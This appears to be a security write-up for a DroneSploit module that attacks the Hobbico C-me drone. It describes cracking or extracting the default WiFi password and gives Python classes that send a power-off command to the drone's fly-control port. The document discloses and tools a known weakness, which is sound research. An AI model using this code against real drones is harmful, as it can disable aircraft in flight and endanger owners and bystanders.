## Security issues

This attack results from 1 security issue :

- Default WiFi password.

## Telnet password recovery

A WPA2-PSK classical guessing attack was achieved using the Aircrack-NG suite, leading to the discovery of the WiFi password.

Moreover, reversing the Android application shows the password. Investigating the sources further leads to the discovery of a list of possible commands, to be sent to a fly control application running on the drone. This way, multiple actions can be commanded, like powering off, therefore causing a DoS.

## DroneSploit module

A generic proxy class was made to implement command sending for drones that use a fly control application (through a TCP or UDP socket), `DroneModule` (see `dronesploit/lib/drones/__init__.py`). The specificity of Hobbico's drones is implemented into `HobbicoModule`, providing a format for the command to be sent.

```python
class HobbicoModule(DroneModule):
    """ Module proxy class for defining multiple common utility methods for
         Hobbico drones.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    payload_format = '{"CMD" : %d, "PARAM" : %s}'
    
    [...]
    
    def _power_off(self):
        self.logger.info("Shutting down the target...")
        self._feedback(self.send_command(32, 0), "Target not powered off")
```

A template proxy class, `CmeModule` is implemented to hold the default configuration options.

```python
class CmeModule(HobbicoModule):
    """ Module proxy class holding the default parameter of a C-me. """
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.100.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 4646,
        Option(
            'TARGET',
            "Target's SSID",
            True,
            choices=lambda o: [e for e in o.state['TARGETS'].keys() \
                               if drone_filter(e, o.module.drone) and \
                               e in o.console.root.connected_targets],
        ): None,
    })
    drone = "Hobbico C-me"
    path = "command/hobbico/cme"
```

The module is finally :

```python
class PowerOff(CmeModule):
    """ Power off the target C-me. """
    def run(self):
        self._power_off()
```
